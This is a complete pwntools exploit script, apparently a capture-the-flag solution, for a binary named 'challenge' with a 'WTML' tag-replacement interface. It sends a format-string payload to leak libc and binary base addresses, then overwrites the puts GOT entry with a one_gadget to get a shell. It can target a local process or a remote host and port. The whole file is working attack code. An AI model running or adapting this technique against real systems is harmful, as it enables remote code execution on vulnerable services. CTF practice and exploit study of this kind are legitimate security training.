#!/usr/bin/env python3

import argparse

from pwn import *


def solve(io):
    print(io.recvuntil(b'Please enter your WTML!\n'))
    payload = b'<\x00>' + b'%13$018p'
    payload += b'A' * (0x20 - len(payload) - 2) + b'</'
    print(hexdump(payload))
    io.send(payload)

    print(io.recvuntil(b'What tag would you like to replace [q to quit]?\n'))
    io.sendline(b'\x00')
    print(io.recvuntil(b'With what new tag?\n'))
    io.sendline(b'\x01')

    print(io.recvuntil(b'What tag would you like to replace [q to quit]?\n'))
    io.sendline(b'A')
    print(io.recvuntil(b'With what new tag?\n'))
    io.sendline(b'B')

    print(io.recvuntil(b'[DEBUG] '))

    leak = io.recvuntil(b'Please provide feedback about v2: ')
    print(hexdump(leak))

    libc_leak = int(leak[5:5 + 16], 16)
    libc_base = libc_leak - elf.libc.sym['_IO_file_write'] - 0x2d
    print('libc base', hex(libc_base))

    text_leak = u64(leak[0x20 + 10 + 1:0x20 + 10 + 1 + 6] + b'\x00' * 2)
    text_base = text_leak - elf.sym['replace_tag_v1']
    print('text base', hex(text_base))

    puts_got = text_base + elf.got['puts']
    one_gadget = libc_base + 0xe3b01

    writes = {
        puts_got: one_gadget
    }
    payload = fmtstr_payload(8, writes)

    print(hexdump(payload))
    io.sendline(payload)


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--debug', action='store_true')
    parser.add_argument('--remote', type=str, default=None)

    args = parser.parse_args()

    elf = context.binary = ELF('challenge')

    if args.debug:
        context.terminal = ['tmux', 'splitw', '-h']
        io = gdb.debug(context.binary.path, '''
        set follow-fork-mode child
        break main
        continue
        ''')
    elif args.remote:
        ip, port = args.remote.split(':')
        io = remote(ip, port)
    else:
        io = process()  # Actually start running the process

    solve(io)

    io.interactive()
